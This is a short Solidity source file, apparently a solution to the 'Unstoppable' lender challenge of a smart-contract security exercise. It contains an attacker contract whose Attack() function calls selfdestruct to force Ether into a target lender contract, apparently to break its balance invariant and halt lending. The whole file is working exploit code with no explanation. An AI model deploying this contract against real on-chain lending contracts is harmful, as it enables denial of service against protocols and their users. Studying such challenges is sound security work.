// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Victim.sol";

contract UnstoppableLenderAttacker {
    address payable lender;

    constructor(address payable _unstoppableAddress) {
        lender = _unstoppableAddress;
    }

    function Attack() public payable {
        selfdestruct(lender);
    }
}
